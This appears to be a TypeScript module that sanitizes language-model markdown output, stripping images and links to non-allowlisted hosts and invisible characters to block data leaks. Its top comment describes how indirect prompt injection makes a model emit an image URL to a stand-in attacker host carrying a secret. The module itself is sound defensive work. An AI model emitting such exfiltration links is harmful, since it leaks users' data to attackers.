import { stripInvisible } from './unicode';

/**
 * Egress filter for **model output** before you render it.
 *
 * A successful indirect injection often tries to exfiltrate data by making the
 * model emit `![x](https://evil.example/log?q=<secret>)` — the browser fetches
 * the image the moment it renders. Stripping images/links to unknown hosts
 * closes that channel.
 */
export interface SanitizeOutputOptions {
  /** Hosts allowed for images. Supports leading wildcard `*.example.com`. Default: none. */
  allowedImageHosts?: string[];
  /** Hosts allowed for links. Default: all (links need a click; images do not). */
  allowedLinkHosts?: string[] | '*';
  /** Remove invisible / tag characters. Default `true`. */
  stripInvisible?: boolean;
  /** Replacement for removed images. Default `[image removed]`. */
  imagePlaceholder?: string;
}

export interface SanitizeOutputResult {
  text: string;
  removedUrls: string[];
  invisibleRemoved: number;
}

export function hostAllowed(url: string, allowed: string[]): boolean {
  let host: string;
  try {
    host = new URL(url).hostname.toLowerCase();
  } catch {
    return false;
  }
  return allowed.some((rule) => {
    const r = rule.toLowerCase();
    if (r.startsWith('*.')) return host === r.slice(2) || host.endsWith(r.slice(1));
    return host === r;
  });
}

const isAbsolute = (u: string) => /^(?:https?:)?\/\//i.test(u) || /^data:/i.test(u);

export function sanitizeModelOutput(
  markdown: string,
  options: SanitizeOutputOptions = {},
): SanitizeOutputResult {
  const imgHosts = options.allowedImageHosts ?? [];
  const linkHosts = options.allowedLinkHosts ?? '*';
  const placeholder = options.imagePlaceholder ?? '[image removed]';
  const removedUrls: string[] = [];
  let text = markdown;
  let invisibleRemoved = 0;

  if (options.stripInvisible ?? true) {
    const r = stripInvisible(text, { collectFindings: false });
    text = r.text;
    invisibleRemoved = r.removed;
  }

  const imageOk = (url: string) =>
    !isAbsolute(url) || (!/^data:/i.test(url) && hostAllowed(normalizeProto(url), imgHosts));
  const linkOk = (url: string) =>
    linkHosts === '*'
      ? !/^\s*(?:javascript|vbscript|data):/i.test(url)
      : !isAbsolute(url) || hostAllowed(normalizeProto(url), linkHosts);

  // Markdown images: ![alt](url "title")
  text = text.replace(
    /!\[([^\]]*)\]\(\s*<?((?:[^()\s<>]|\([^()\s]*\))+)>?(?:\s+"[^"]*")?\s*\)/g,
    (m, _alt: string, url: string) => {
      if (imageOk(url)) return m;
      removedUrls.push(url);
      return placeholder;
    },
  );
  // Reference-style image definitions: [id]: url
  text = text.replace(
    /^\s*\[([^\]]+)\]:\s*<?(\S+?)>?(?:\s+"[^"]*")?\s*$/gm,
    (m, _id: string, url: string) => {
      if (linkOk(url) && imageOk(url)) return m;
      removedUrls.push(url);
      return '';
    },
  );
  // HTML <img>
  text = text.replace(/<img\b[^>]*\bsrc\s*=\s*["']?([^"'\s>]+)["']?[^>]*>/gi, (m, url: string) => {
    if (imageOk(url)) return m;
    removedUrls.push(url);
    return placeholder;
  });
  // Markdown links: [text](url)
  text = text.replace(
    /(?<!!)\[([^\]]*)\]\(\s*<?((?:[^()\s<>]|\([^()\s]*\))+)>?(?:\s+"[^"]*")?\s*\)/g,
    (m, label: string, url: string) => {
      if (linkOk(url)) return m;
      removedUrls.push(url);
      return label;
    },
  );

  return { text, removedUrls, invisibleRemoved };
}

function normalizeProto(url: string): string {
  return url.startsWith('//') ? `https:${url}` : url;
}
